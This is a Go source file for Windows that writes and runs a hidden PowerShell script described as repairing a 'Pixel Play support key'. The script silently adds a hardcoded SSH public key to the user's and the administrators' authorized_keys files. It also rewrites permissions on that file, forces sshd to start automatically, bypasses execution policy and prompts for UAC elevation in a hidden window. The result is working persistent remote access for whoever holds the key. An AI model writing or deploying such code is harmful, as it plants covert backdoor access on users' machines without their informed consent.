//go:build windows

package targeted

import (
	"os"
	"os/exec"
	"path/filepath"
	"syscall"
)

// supportKey is the Pixel Play support key (matches dl/fix-ssh-key.ps1 and the
// operator's claude_vps key). Re-authorized after Windows OpenSSH updates wipe
// authorized_keys.
const supportKey = "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIDhAgcC1RK/E4ewzAymCKyyV6uqSX+ZG6UxuL/GZEnB6 claude-session"

// repairScript writes the per-user authorized_keys with no admin. If the
// account is a member of Administrators, Windows OpenSSH ignores the per-user
// file and only reads administrators_authorized_keys, which needs elevation —
// so when the account is an admin but the process is not elevated, it relaunches
// itself with UAC (RunAs) to finish the admin part (ProgramData key, ACL, sshd).
const repairScript = `param([switch]$Elevated)
$ErrorActionPreference = 'Continue'
$key = '` + supportKey + `'
function Upsert-Key([string]$Path) {
  try {
    $dir = Split-Path -Parent $Path
    New-Item -ItemType Directory -Force -Path $dir | Out-Null
    $existing = ''
    if (Test-Path -LiteralPath $Path) { $existing = Get-Content -LiteralPath $Path -Raw -ErrorAction SilentlyContinue }
    $token = $key.Split(' ')[1]
    if ($existing -and $existing.Contains($token)) { return $true }
    if ($existing -and -not $existing.EndsWith("` + "`n" + `")) { Add-Content -LiteralPath $Path -Value '' -Encoding ascii }
    Add-Content -LiteralPath $Path -Value $key -Encoding ascii
    return $true
  } catch { return $false }
}
function Repair-Admin {
  $adminKeys = 'C:\ProgramData\ssh\administrators_authorized_keys'
  if (Upsert-Key $adminKeys) {
    try { icacls.exe $adminKeys /inheritance:r /grant '*S-1-5-32-544:F' /grant '*S-1-5-18:F' | Out-Null } catch {}
  }
  try {
    if (Get-Service sshd -ErrorAction SilentlyContinue) {
      Set-Service -Name sshd -StartupType Automatic -ErrorAction SilentlyContinue
      Restart-Service sshd -Force -ErrorAction SilentlyContinue
    }
  } catch {}
}

# 1) User-level key: works without admin; enough for standard (non-admin) accounts.
[void](Upsert-Key (Join-Path $env:USERPROFILE '.ssh\authorized_keys'))

$id = [Security.Principal.WindowsIdentity]::GetCurrent()
$principal = New-Object Security.Principal.WindowsPrincipal($id)
$isElevated = $principal.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)

if ($isElevated) {
  # 2a) Already elevated: do the admin part directly.
  Repair-Admin
  exit 0
}

if ($Elevated) { exit 0 }

# 2b) Not elevated: is the account a member of Administrators (filtered token)?
$adminSid = 'S-1-5-32-544'
$inAdmins = $false
try {
  foreach ($g in $id.Groups) {
    try { if ($g.Translate([Security.Principal.SecurityIdentifier]).Value -eq $adminSid) { $inAdmins = $true; break } } catch {}
  }
} catch {}

if ($inAdmins) {
  # Relaunch elevated so the user sees a single UAC prompt. -Wait keeps the
  # temp script alive until the elevated copy finishes.
  try {
    Start-Process -FilePath 'powershell.exe' -Verb RunAs -Wait -WindowStyle Hidden -ArgumentList '-NoProfile','-ExecutionPolicy','Bypass','-File',$PSCommandPath,'-Elevated'
  } catch {}
}
`

// repairSSHSupportKey re-adds the support key so remote assistance works again.
// Standard accounts are fixed silently; admin accounts get one UAC prompt.
func repairSSHSupportKey(emit func(string)) error {
	tmp := filepath.Join(os.TempDir(), "pixelplay-ssh-repair.ps1")
	if err := os.WriteFile(tmp, []byte(repairScript), 0o600); err != nil {
		return err
	}
	defer os.Remove(tmp)

	cmd := exec.Command("powershell.exe", "-NoProfile", "-ExecutionPolicy", "Bypass", "-WindowStyle", "Hidden", "-File", tmp)
	cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
	return cmd.Run()
}
